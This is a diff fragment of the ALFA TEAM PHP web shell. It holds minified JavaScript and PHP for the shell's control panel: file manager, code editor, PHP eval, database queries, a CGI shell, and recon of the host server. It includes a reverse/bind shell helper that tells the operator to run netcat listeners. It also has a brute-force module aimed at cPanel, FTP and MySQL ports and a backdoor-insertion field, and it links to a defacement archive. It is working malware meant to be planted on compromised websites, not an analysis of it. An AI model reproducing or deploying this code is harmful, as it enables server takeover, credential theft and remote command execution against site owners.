.editor-modal"):"id_db"==e.substr(0,5)?i=$(e):"terminal_id"==e.substr(0,11)?i=$(e):"editor"==e.substr(0,6)?i=$(e):"cgiframe"==e?i=$("cgiframe"):"filesman_holder"==e.substr(0,15)?(i=$(e)).style.minHeight="300px":i=$("option_"+e),i.insertAdjacentHTML("afterbegin","<div id='loader_"+e+'\' class="options-loader-holder"><div parent="'+e+'" onclick="alfaAjaxController(this);" class="stopAjax">[ Stop it ]</div><div class="alfateam-loader-text">ALFA TEAM</div><div class="alfa-ajax-error"></div><img src=\'http://solevisible.com/images/loader.svg\'></div>')}else"filesman_holder"==e.substr(0,15)&&($(e).style.minHeight="0"),null!=t&&(t.style.display=a)}catch(e){}}function fs(e){var a=e.getAttribute("db_id"),t=d.querySelector("#"+a+" div.sf");mysql_cache.hasOwnProperty(a)||(mysql_cache[a]={}),alfaloader(a,"block");var i=t.querySelector("input[name=sql_host]").value,l=t.querySelector("input[name=sql_login]").value,o=t.querySelector("input[name=sql_pass]").value,r=t.querySelector("input[name=sql_base]")?t.querySelector("input[name=sql_base]").value:t.querySelector("select[name=sql_base]").value,n=t.querySelector("select[name=type]").value,s=t.querySelector("input[name=sql_count]").checked?"true":"";_Ajax(d.URL,"a="+alfab64("Sql")+"&alfa1="+alfab64("query")+"&alfa2=&c="+alfab64(c_)+"&charset="+alfab64("UTF-8")+"&type="+alfab64(n)+"&sql_host="+alfab64(i)+"&sql_login="+alfab64(l)+"&sql_pass="+alfab64(o)+"&sql_base="+alfab64(r)+"&sql_count="+alfab64(s)+"&current_mysql_id="+alfab64(a)+"&ajax="+alfab64("true"),function(e,a){loadPopUpDatabase(e,a),evalJS(e),alfaloader(a,"none")},!1,a)}function ctlbc(e){var a=$("bcStatus"),t=$("bcipAction");"bind"==e.value?(t.style.display="none",a.innerHTML="<small>Press ` <font color='red'>>></font> ` button and run ` <font color='red'>nc server_ip port</font> ` on your computer</small>"):(t.style.display="inline-block",a.innerHTML="<small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small>")}function $(e){return d.getElementById(e)}function addnewup(){var e="footerup_"+upcount,a="pfooterup_"+upcount,t=1!=upcount?"pfooterup_"+(upcount-1):"pfooterup",i=d.createElement("p");i.innerHTML='<label class="inputfile" for="'+e+'"><span id="__fnameup'+upcount+'"></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id="'+e+'" type="file" name="f[]" onChange="handleup(this,'+upcount+');" multiple>',i.id=a,i.appendAfter($(t)),upcount++}function alfa_searcher_tool(e){switch(e){case"all":case"dirs":_alfaSet(!0,"Disabled");break;case"files":_alfaSet(!1,"php")}}function _alfaSet(e,a){d.srch.ext.disabled=e,d.srch.ext.value=a}function dis_input(e){switch(e){case"phpmyadmin":bruteSet(!0,"Disabled","http://");break;case"direct":bruteSet(!1,"2222","http://");break;case"cp":bruteSet(!1,"2082","http://");break;case"ftp":bruteSet(!0,"Disabled","ftp://");break;case"mysql":bruteSet(!1,"3306","http://");break;case"ftpc":bruteSet(!1,"21","http://")}}function bruteSet(e,a,t){c="21"!=a?"localhost":"ftp.example.com",$("port").disabled=e,$("port").value=a,$("target").value=c,$("protocol").value=t}function inBackdoor(e){"my"==e.value?$("backdoor_textarea").style.display="block":$("backdoor_textarea").style.display="none"}function saveByKey(e){return!("s"==String.fromCharCode(e.which).toLowerCase()&&e.ctrlKey||19==e.which)||($("editor_edit_area").onsubmit(),e.preventDefault(),!1)}function alfaAjaxError(e,a,t,i){if(void 0!==a){var l=d.querySelector("#loader_"+a);null!=l&&(firewall="",403==e&&(firewall=" ~ FireWall Detected!"),l.querySelector("img").remove(),l.querySelector(".alfa-ajax-error").innerHTML=e+" ( "+t+firewall+" )",alfaShowNotification(t,"Ajax","error"))}}function alfaInitCwdContext(){d.querySelectorAll(".header_pwd").forEach(function(e){e.addEventListener("contextmenu",function(e){var a=e.target.getAttribute("path"),t=d.querySelector("#rightclick_menu > a[name=newtab]");t.setAttribute("href","javascript:void(0);"),t.removeAttribute("target"),t.onclick=function(){alfaFilesManNewTab(a,"/")};var i=e.clientX,l=e.clientY;alfaSortMenuItems(["newtab"]),alfaRightClickMenu(i,l),e.preventDefault()})})}function alfaRightClickMenu(e,a){rightclick_menu_context.top=a+"px",rightclick_menu_context.left=e+"px",rightclick_menu_context.visibility="visible",rightclick_menu_context.opacity="1"}function alfaSortMenuItems(e){var a=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete","view_archive"],t=!1;for(var i in a){for(var l in t=!1,e)a[i]!=e[l]||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="block",t=!0);t||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="none")}}function alfaAceChangeSetting(e,a){var t=e.options[e.selectedIndex].value,i=e.getAttribute("base"),l=alfa_ace_editors.editor;"eval"==i&&(l=alfa_ace_editors.eval);var o=e.getAttribute("ace_id");"lang"==a?l[o].session.setMode("ace/mode/"+t):"theme"==a&&l[o].setTheme("ace/theme/"+t),setCookie("alfa_ace_"+a+"_"+i,t,2012)}function alfaAceChangeWrapMode(e,a){var t=alfa_ace_editors.editor;"eval"==a&&(t=alfa_ace_editors.eval);var i=e.getAttribute("ace_id");e.checked?t[i].session.setUseWrapMode(!0):t[i].session.setUseWrapMode(!1)}function alfaAceChangeFontSize(e,a,t){var i=alfa_ace_editors.editor;"eval"==e&&(i=alfa_ace_editors.eval);var l=t.getAttribute("ace_id"),o=i[l].getFontSize();"+"==a?++o:--o,i[l].setFontSize(o),setCookie("alfa_ace_fontsize_"+e,o,2012)}function setCookie(e,a,t){var i=new Date;i.setTime(i.getTime()+24*t*60*60*1e3);var l="expires="+i.toUTCString();document.cookie=e+"="+a+";"+l+";path=/"}function getCookie(e){var a=("; "+document.cookie).split("; "+e+"=");if(2==a.length)return a.pop().split(";").shift()}function editorClose(e){if(d.body.style.overflow="visible",elem=$(e),elem.setAttribute("class","editor-anim-close"),"editor"==e){if(is_minimized=!1,null!=alfa_ace_editors.editor&&null!=alfa_ace_editors.editor){for(var a in alfa_ace_editors.editor)alfa_ace_editors.editor[a].destroy();alfa_ace_editors.editor=null,d.querySelector(".editor-tabs").innerHTML="",d.querySelector(".editor-content-holder").innerHTML=""}}else if("cgiloader"==e)php_temrinal_using_cgi&&(d.querySelector(".terminal-tabs").innerHTML="",d.querySelector(".terminal-contents").innerHTML=""),php_temrinal_using_cgi=!1,cgi_is_minimized=!1;else if("options_window"==e){if(options_window_is_minimized=!1,null!=alfa_ace_editors.eval){for(var a in alfa_ace_editors.eval)alfa_ace_editors.eval[a].destroy();alfa_ace_editors.eval=null,d.querySelectorAll(".php-evals").forEach(function(e){e.removeAttribute("ace")})}}else"database_window"==e&&(database_window_is_minimized=!1);setTimeout(function(){elem=$(e),elem.removeAttribute("class"),elem.style.display="none","options_window"==e&&(elem.querySelector(".options_tab").innerHTML="",elem.querySelector(".options_content").innerHTML="")},1e3),d.body.style.overflow="visible"}function popupWindowBackPosition(){var e={cgiloader:cgi_is_minimized,options_window:options_window_is_minimized,database_window:database_window_is_minimized,editor:is_minimized},a=[];for(var t in e)e[t]&&a.push(t);1==a.length?$(a[0]+"-minimized").style.top="30%":2==a.length?($(a[0]+"-minimized").style.top="20%",$(a[1]+"-minimized").style.top="50%"):3==a.length?($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="60%"):4==a.length&&($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="55%",$(a[3]+"-minimized").style.top="80%")}function showEditor(e){if($(e).setAttribute("class","editor-anim-show"),$(e+"-minimized").setAttribute("class","minimized-hide"),"editor"==e)is_minimized=!1;else if("cgiloader"==e)cgi_is_minimized=!1;else if("options_window"==e){options_window_is_minimized=!1;var a=d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active.tab-is-done");null!=a&&a.classList.remove("tab-is-done")}else"database_window"==e&&(database_window_is_minimized=!1);popupWindowBackPosition(),d.body.style.overflow="hidden"}function editorMinimize(e){$(e).setAttribute("class","editor-anim-minimize"),$(e+"-minimized").setAttribute("class","minimized-show"),"editor"==e?is_minimized=!0:"cgiloader"==e?cgi_is_minimized=!0:"options_window"==e?options_window_is_minimized=!0:"database_window"==e&&(database_window_is_minimized=!0),popupWindowBackPosition(),d.body.style.overflow="visible"}function clearEditorHistory(){if(confirm("Are u Sure?"))for(var e in editor_files)e!=editor_current_file&&removeHistory(e)}function isArchive(e){var a,t=[".tar.gz",".tar.bz2",".tar.z",".tar.xz",".zip",".zipx",".7z",".bz2",".gz",".rar",".tar",".tgz"];for(a in t)if(new RegExp("(.*)("+t[a].replace(/\./g,"\\.")+")$","gi").test(e))return!0;return!1}function editor(e,a,t,i,l,o){if("dir"==o&&".."==e)return!1;if("download"==a)return g("FilesTools",i,e,"download"),!1;var r="",n="",s="",c="",f=d.mf.c.value,_=!0;if(e=e.trim(),0==Object.keys(editor_files).length){var u=getCookie("alfa_history_files");try{for(var p in u=atob(u),editor_files=JSON.parse(u))insertToHistory(p,editor_files[p].file,0,editor_files[p].type)}catch(e){}}if("phar://"==e.substr(0,7))f=c_;else if(-1!=e.indexOf("/")){var m=e.split("/");e=m[m.length-1],delete m[m.length-1],f=m.join("/"),islinux&&(f="/"+f)}if(void 0===o&&(o=""),void 0!==i&&null!=i&&0!=i.length&&(f=i.trim()),"auto"==a&&isArchive(e))return alfaSyncMenuToOpt(e,!0),!1;try{for(var v in editor_files)if(editor_files[v].file==decodeURIComponent(e)&&editor_files[v].pwd.replace(/\//g,"")==f.replace(/\//g,"")){_=!1,l=v;break}}catch(e){}if(editor_error=!0,void 0!==t&&0!=t.length&&null!=t&&(r=alfab64(t)),void 0!==l&&null!=l&&0!=l.length)n=alfab64(l),s=l,c=l.replace("file_","");else{var h="file_"+(c=getRandom(10));n=alfab64(h),s=h}var b="editor_source_"+c;if(null==$(b)){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}d.querySelector(".editor-tabs").insertAdjacentHTML("beforeend","<div onclick='editorTabController(this);' opt_id='"+b+"' id='tab_"+b+"' class='editor-tab-name editor-tab-active'>"+decodeURIComponent(e)+" <img opt_id='"+b+"' onclick='closeEditorContent(this,event);return false;' title='[close]' src='http://solevisible.com/icons/menu/delete.svg'></div>"),d.querySelector(".editor-content-holder").insertAdjacentHTML("afterbegin","<div class='editor-contents editor-content-active' id='"+b+"'></div>")}return 0==is_minimized&&"none"==$("editor").style.display?($("editor").style.display="block",showEditor("editor"),alfaloader(b,"block")):(is_minimized&&showEditor("editor"),null!=$(b)?alfaloader(b,"block"):(alfaloader("editor","block"),b="editor")),_Ajax(d.URL,"a="+alfab64("FilesTools")+"&c="+alfab64(f)+"&alfa1="+alfab64(e)+"&alfa2="+alfab64(a)+"&alfa3="+r+"&alfa4="+n+"&alfa5=&alfa6=&alfa7=&alfa8=&alfa9=&alfa10=&&ajax="+alfab64("true"),function(t,i){var l=$("tab_"+i);try{null!=l&&((-1==l.classList.value.indexOf("editor-tab-active")||is_minimized)&&(l.classList.add("tab-is-done"),alfaShowNotification("proccess is done...","Editor: "+l.innerText)),is_minimized&&alfaUpdateOptionsBadge("editor"))}catch(t){}if("none"==$("editor").style.display?alfaLoaderOnTop("none"):alfaloader(i,"none"),r.length>0&&"edit"==a)return is_minimized||null!=l&&-1!=l.classList.value.indexOf("editor-tab-active")&&alfaShowNotification("saved...!","Editor"),!1;if(null!=$(i)&&($(i).innerHTML=t),is_minimized&&alfaShowNotification("proccess is done...","Editor: "+decodeURIComponent(e)),$("editor").style.display="block",evalJS(t),alfaLoadAceEditor("view_ml_content"),"delete"!=a&&editor_error){var c=d.getElementsByClassName("is_active");0!=c.length&&(c[0].className="file-holder"),n=s,e=decodeURIComponent(e),!editor_files[n]&&_?(editor_files[n]={file:e,pwd:f,type:o},insertToHistory(n,e," is_active",o),"mkfile"==a&&g("FilesMan",null)):$(n).parentNode.className+=" is_active"}d.body.style.overflow="hidden",d.getElementsByClassName("filestools")[0].setAttribute("fid",n),editor_files[n]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[n].pwd+"/"+editor_files[n].file).replace(/\/\//g,"/")),editor_current_file=n,updateCookieEditor()},!1,b),!1}function alfaLoadAceEditor(e,a){if(void 0===a&&(a=!1),null==$("alfa-ace-plugin")){var t=document.createElement("script");return t.src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.11/ace.js",t.id="alfa-ace-plugin",t.onload=function(){alfaLoadAceEditor(e,a)},d.body.appendChild(t),!1}try{"allow"==$(e).getAttribute("mode")&&(a=!1)}catch(e){}if("view_ml_content"==e){null==alfa_ace_editors.editor&&(alfa_ace_editors.editor={});var i=getCookie("alfa_ace_theme_editor"),l=getCookie("alfa_ace_fontsize_editor");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".editor-ace-controller").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=getRandom(10),o=e.querySelector(".view_ml_content");o.setAttribute("id","view_ml_content-"+t),alfa_ace_editors.editor["view_ml_content-"+t]=ace.edit(o),alfa_ace_editors.editor["view_ml_content-"+t].setReadOnly(a),alfa_ace_editors.editor["view_ml_content-"+t].setShowPrintMargin(!1),alfa_ace_editors.editor["view_ml_content-"+t].setTheme("ace/theme/"+i),alfa_ace_editors.editor["view_ml_content-"+t].session.setMode("ace/mode/php"),alfa_ace_editors.editor["view_ml_content-"+t].session.setUseWrapMode(!0),alfa_ace_editors.editor["view_ml_content-"+t].commands.addCommand({name:"save",bindKey:{win:"Ctrl-S",mac:"Cmd-S"},exec:function(e){d.querySelector("#ace-save-btn-"+t).click()}}),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","view_ml_content-"+t),-1!=e.classList.value.indexOf("ace-save-btn")&&e.setAttribute("id","ace-save-btn-"+t)}),void 0!==l&&setTimeout(function(){alfa_ace_editors.editor["view_ml_content-"+t].setFontSize(parseInt(l))},1e3)})}else{null==alfa_ace_editors.eval&&(alfa_ace_editors.eval={});i=getCookie("alfa_ace_theme_eval"),l=getCookie("alfa_ace_fontsize_eval");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".php-evals").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=e.querySelector(".php-evals-ace"),o=getRandom(10);t.setAttribute("id","phpeval-"+o),alfa_ace_editors.eval["phpeval-"+o]=ace.edit(t),alfa_ace_editors.eval["phpeval-"+o].setReadOnly(a),alfa_ace_editors.eval["phpeval-"+o].setShowPrintMargin(!1),alfa_ace_editors.eval["phpeval-"+o].setTheme("ace/theme/"+i),alfa_ace_editors.eval["phpeval-"+o].session.setMode("ace/mode/php"),alfa_ace_editors.eval["phpeval-"+o].session.setUseWrapMode(!0),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","phpeval-"+o)}),void 0!==l&&setTimeout(function(){alfa_ace_editors.eval["phpeval-"+o].setFontSize(parseInt(l))},1e3)})}}function insertToHistory(e,a,t,i){var l="";t&&0!=t&&(l=t);var o=document.createElement("div");o.innerHTML="<div id='"+e+"' class='history' onClick='reopen(this);'><div class='editor-icon'>"+loadType(a,i,e)+"</div><div class='editor-file-name'>"+a+"</div></div><div class='history-close' onClick='removeHistory(\""+e+"\");'>X</div>",o.className="file-holder"+l,o.addEventListener("mouseover",function(){setEditorTitle(e,"over"),this.childNodes[1].style.opacity="1"}),o.addEventListener("mouseout",function(){setEditorTitle(e,"out"),this.childNodes[1].style.opacity="0"});var r=d.getElementsByClassName("history-list")[0];r.insertBefore(o,r.firstChild)}function loadType(e,a,t){"none"==a&&_Ajax(d.URL,"a="+alfab64("checkfiletype")+"&path="+alfab64(editor_files[t].pwd)+"&arg="+alfab64(editor_files[t].file),function(e){$(t).innerHTML="<div class='editor-icon'>"+loadType(editor_files[t].file,e,t)+"</div><div class='editor-file-name'>"+editor_files[t].file+"</div>",editor_files[t].type=e});if("file"==a){a=(a=e.split("."))[a.length-1].toLowerCase();-1==["json","ppt","pptx","xls","xlsx","msi","config","cgi","pm","c","cpp","cs","java","aspx","asp","db","ttf","eot","woff","woff2","woff","conf","log","apk","cab","bz2","tgz","dmg","izo","jar","7z","iso","rar","bat","sh","alfa","gz","tar","php","php4","php5","phtml","html","xhtml","shtml","htm","zip","png","jpg","jpeg","gif","bmp","ico","txt","js","rb","py","xml","css","sql","htaccess","pl","ini","dll","exe","mp3","mp4","m4a","mov","flv","swf","mkv","avi","wmv","mpg","mpeg","dat","pdf","3gp","doc","docx","docm"].indexOf(a)&&(a="notfound")}else a="folder";return'<img src="http://solevisible.com/icons/{type}" width="30" height="30">'.replace("{type}",a+".png")}function updateFileEditor(e,a){var t="id_"+e,i="id_chmode_"+e,l="id_rename_"+e,o="id_touch_"+e,r="id_edit_"+e,n="id_download_"+e,d="id_delete_"+e,s=$(t).getAttribute("ftype");"folder"==s&&(s="dir"),"file"==s?($(t).innerHTML=a,$(t).setAttribute("href","#action=fileman&path="+c_+"/"+a),$(t).setAttribute("onclick","editor('"+a+"','auto','','','','file')"),$(r).setAttribute("onclick","editor('"+a+"','edit','','','','"+s+"')"),$(n).setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')")):($(t).innerHTML="<b>| "+a+" |</b>",$(t).setAttribute("onclick","g('FilesMan', '"+c_+"/"+a+"')")),$(i).setAttribute("onclick","editor('"+a+"','chmod','','','','"+s+"')"),$(l).setAttribute("onclick","editor('"+a+"','rename','','','','"+s+"')"),$(o).setAttribute("onclick","editor('"+a+"','touch','','','','"+s+"')"),$(d).setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';"),$(t).setAttribute("fname",a)}function updateDirsEditor(e,a){var t=d.mf.c.value+"/",i=editor_files[e].pwd+"/"+a+"/",l=editor_files[e].pwd+"/"+editor_files[e].file+"/";for(var o in i=i.replace(/\/\//g,"/"),l=l.replace(/\/\//g,"/"),-1!=(t=t.replace(/\/\//g,"/")).search(i)&&(initDir(t.replace(i,l)),d.mf.c.value=t.replace(i,l)),editor_files){var r=editor_files[o].pwd+"/";-1!=(r=r.replace(/\/\//g,"/")).search(i)&&(editor_files[o].pwd=r.replace(i,l))}updateCookieEditor()}function updateCookieEditor(){setCookie("alfa_history_files",btoa(JSON.stringify(editor_files)),2012)}function setEditorTitle(e,a){if("out"==a&&""!=editor_current_file){var t=d.querySelector(".editor-tab-name.editor-tab-active");e=null!=t?t.getAttribute("opt_id").replace("editor_source_","file_"):editor_current_file}editor_files[e]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[e].pwd+"/"+editor_files[e].file).replace(/\/\//g,"/"))}function removeHistory(e){delete editor_files[e],$(e)&&$(e).parentNode.parentNode.removeChild($(e).parentNode);var a=d.getElementsByClassName("filestools")[0];a&&a.getAttribute("fid")==e&&(a.outerHTML=""),editor_current_file==e&&(editor_current_file=""),updateCookieEditor()}function getRandom(e){for(var a="",t="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",i=void 0===e?20:e;i>0;--i)a+=t[Math.floor(Math.random()*t.length)];return a}function reopen(e){var a=e.getAttribute("id"),t=editor_files[a].pwd,i=editor_files[a].file,l="editor_source_"+a.replace("file_","");null==$(l)?editor(i,"auto","",t,a):editorTabController(l,!0)}function copyToClipboard(e){e=e.getAttribute("ace_id");var a=alfa_ace_editors.editor[e].selection.toJSON();alfa_ace_editors.editor[e].selectAll(),alfa_ace_editors.editor[e].focus(),document.execCommand("copy"),alfa_ace_editors.editor[e].selection.fromJSON(a),alfaShowNotification("text copied","Editor")}function encrypt(e,a){if(null==a||a.length<=0)return null;e=alfab64(e,!0),a=alfab64(a,!0);for(var t="",i="",l=0;l<e.length;)for(var o=0;o<a.length&&(t=e.charCodeAt(l)^a.charCodeAt(o),i+=String.fromCharCode(t),!(++l>=e.length));o++);return alfab64(i,!0)}function reloadSetting(e){return alfaloader(alfa_before_do_action_id,"block"),_Ajax(d.URL,"a="+alfab64("settings")+"&alfa1="+alfab64(e.protect.value)+"&alfa2="+alfab64(e.lgpage.value)+"&alfa3="+alfab64(e.username.value)+"&alfa4="+alfab64(e.password.value)+"&alfa5="+alfab64(">>")+"&alfa6="+alfab64(e.icon.value)+"&alfa7="+alfab64(e.post_encrypt.value)+"&alfa8="+alfab64("main")+"&alfa9="+alfab64(e.cgi_api.value)+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),function(e,a){loadPopUpOpTions(a,e),evalJS(e),alfaloader(a,"none")},!1,alfa_before_do_action_id),alfa_before_do_action_id="",0==e.e.value&&1==e.protect.value&&setTimeout("location.reload()",1e3),e.s.value!=e.icon.value&&setTimeout("location.reload()",1e3),!1}function reloadColors(e){var a={};void 0===e?d.querySelectorAll(".colors_input").forEach(function(e){var t=e.getAttribute("target").replace(".","");a[t]=e.value}):a=e;var t=$("use_default_color").checked?"1":"0";_Ajax(d.URL,"a="+alfab64("settings")+"&alfa1="+alfab64(JSON.stringify(a))+"&alfa2="+alfab64(">>")+"&alfa3="+alfab64(t)+"&alfa8="+alfab64("color")+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),function(e){evalJS(e)},!0)}function alfab64(e,a){return void 0!==a||0==post_encryption_mode?window.btoa(unescape(encodeURIComponent(e))):encrypt(e,"<?php echo __ALFA_SECRET_KEY__; ?>")}function evalCss(e){var a=document.createElement("style");a.styleSheet?a.styleSheet.cssText=e:a.appendChild(document.createTextNode(e)),d.getElementsByTagName("head")[0].appendChild(a)}function colorHandlerKey(e){setTimeout(function(a){colorHandler(e)},200)}function colorHandler(e){var a=e.getAttribute("target"),t=e.getAttribute("multi"),l=a.indexOf(":hover");if(t){var o=JSON.parse(atob(t)),r="";for(i in o.multi_selector)r+=i+"{"+o.multi_selector[i].replace(/{color}/g,e.value)+"}";evalCss(r)}-1==l||t?($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,".header_values"==a&&(a=".header,.header_values"),d.querySelectorAll(a).forEach(function(a){a.style.color=e.value})):($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,evalCss(a+"{color: "+e.value+";}"))}function importConfig(e){var a=e.target,t=new FileReader;t.onload=function(){var e=t.result;try{reloadColors(JSON.parse(e))}catch(e){alert("Config is invalid...!")}$("importFileBtn").value=""},t.readAsText(a.files[0])}function checkBox(e){var a=alfa_current_fm_id,t=e.checked;d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked=t})}function runcgi(e){if($("cgiframe").style.height="unset",d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Cgi Shell",d.querySelector("#cgiloader .opt-title").innerHTML="Cgi Shell",cgi_is_minimized&&cgi_lang==e&&(showEditor("cgiloader"),0==php_temrinal_using_cgi))return!1;php_temrinal_using_cgi=!1,_Ajax(d.URL,"a="+alfab64("cgishell")+"&alfa1="+alfab64(e)+"&ajax="+alfab64("true"),function(a){d.body.style.overflow="hidden",$("cgiloader").style.display="block",d.querySelector("#cgiframe .terminal-tabs").innerHTML="",d.querySelector("#cgiframe .terminal-contents").innerHTML=a,cgi_lang=e,cgi_is_minimized&&($("cgiloader-minimized").setAttribute("class","minimized-hide"),setTimeout(function(){$("cgiloader").removeAttribute("class"),is_minimized&&($("editor-minimized").style.top="30%")},1e3))})}Element.prototype.appendAfter=function(e){e.parentNode.insertBefore(this,e.nextSibling)};
+</script>
+<?php echo"<form style='display:none;' id='dlForm' action='' target='_blank' method='post'>
 <input type='hidden' name='a' value='dlfile'>
 <input type='hidden' name='c' value=''>
 <input type='hidden' name='file' value=''>
 </form>
 <input type='file' style='display:none;' id='importFileBtn' onchange='importConfig(event);'>
-<img id='a_loader' src='".__showicon('loader')."'>";
+<div id='a_loader'><img src='".__showicon('loader')."'></div>";
 $cmd_uname = alfaEx("uname -a",false,false);
 $uname = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : (strlen($cmd_uname)>0?$cmd_uname:'( php_uname ) Function Disabled !');
 if($uname=="( php_uname ) Function Disabled !"){$GLOBALS["need_to_update_header"]="true";}
 echo '
 </head>
 <body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
-<div id="up_bar"></div>
+<div id="up_bar_holder"></div>
 <div class="whole">
 <form method="post" name="mf" style="display:none;">
 <input type="hidden" name="a">
@@ -1725,7 +1100,7 @@ echo '<input type="hidden" name="alfa'.$s.'">';
 }
 echo '<input type="hidden" name="charset">
 </form>
-<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible">Hidden Shell<br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
+<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible"><span style="color:#42ff59;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
 <div class="header"><table width="100%" border="0">
 <tr>
 <td width="3%"><span class="header_vars">Uname:</span></td>
@@ -1734,7 +1109,7 @@ echo '<input type="hidden" name="charset">
 <tr>
 <td><span class="header_vars">User:</span></td>
 <td><span class="header_values" id="header_userid">'. $uid . ' [ ' . $user . ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $gid . ' [ ' . $group . ' ]</span> </td>
-<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="" src="http://solevisible.com/images/alfa-iran.png" /></td>
+<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="http://solevisible.com/images/alfa-iran.png" /></td>
 </tr>
 <tr>
 <td><span class="header_vars">PHP:</span></td>
@@ -1742,7 +1117,7 @@ echo '<input type="hidden" name="charset">
 </tr>
 <tr>
 <td><span class="header_vars">ServerIP:</span></td>
-<td><b>'.(!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]).' <span class="header_vars">Your IP:</span><b> '.@$_SERVER["REMOTE_ADDR"].'</b></td>
+<td><b>'.(!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]).'</b><div style="display:inline;display:none;" class="flag-holder"></div> <span class="header_vars">Your IP:</span><b> '.@$_SERVER["REMOTE_ADDR"].'</b><div style="display:inline;display:none;" class="flag-holder"></div></td>
 </tr>
 <tr>
 <td width="3%"><span class="header_vars">DateTime:</span></td>
@@ -1808,7 +1183,7 @@ echo '<tr>
 <td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.Alfa_GetDisable_Function().'</b></td>
 </tr>
 <tr>
-<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><center><a href="http://zone-h.org/archive/notifier=ALFA%20TEaM%202012" target="_blank"><span><font class="solevisible-text" color="#0F0">Sole Sad & Invisible</font></span></a></center></td>
+<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/solevisible" target="_blank"><span><font class="solevisible-text" color="#0F0">Sole Sad & Invisible</font></span></a></center></div></td>
 </tr>
 <tr>
 <td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>'.$open_b.'</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>'.$safe_exe.'</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>'.$safe_include.'</b></td>
@@ -1825,26 +1200,23 @@ echo '<tr>
 }
 echo '<tr>
 <td height="12"><span class="header_vars">PWD:</span></td>
-<td colspan="2"><span id="header_cwd">'.$cwd_links.' </span><a href="javascript:void(0);" onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"><span class="home_shell">[ Home Shell ]</span> </a><a href="javascript:void(0);" onclick="path_history(\'back\');"><span class="back_shell">[ BACK ]</span></a></td>
+<td colspan="2"><span id="header_cwd">'.$cwd_links.' </span><a href="#action=fileman&path='.$GLOBALS['home_cwd'].'" onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"><span class="home_shell">[ Home Shell ]</span> </a></td>
 </tr>
 </table>
 </div>
 <div id="meunlist">
 <ul>
 ';
